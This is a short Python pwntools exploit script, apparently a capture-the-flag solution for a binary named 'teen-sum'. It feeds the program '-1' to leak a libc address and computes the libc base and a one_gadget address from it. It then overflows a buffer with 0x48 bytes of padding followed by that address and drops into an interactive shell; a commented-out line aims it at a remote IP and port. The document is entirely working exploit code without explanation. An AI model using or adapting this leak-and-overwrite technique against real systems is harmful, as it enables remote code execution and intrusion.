from pwn import *

context.log_level='critical'
p=process("./teen-sum")
#p=remote("34.71.103.59",14141)
e=ELF("./teen-sum")
libc = ELF("./libc.so.6")
debug = False


p.sendlineafter(b">",b"-1")
p.recvuntil("Hey ")

leak = u64(p.recvline()[:-1].ljust(8,b"\x00"))

log.critical(f"Leak :: {hex(leak)}")
base = leak - 0x223e10
one_gadget = base + 0xe6c81

log.critical(f"base :: {hex(base)}")
log.critical(f"one_gadget :: {hex(one_gadget)}")


p.sendlineafter(b"many","1")
p.sendlineafter(b">","1")
p.sendlineafter(b"name","1")
p.sendlineafter(b">",b"900")

ropchain=b"\x00"*0x48
ropchain += p64(one_gadget)


if debug:
    gdb.attach(p)

p.sendline(ropchain)
p.interactive()
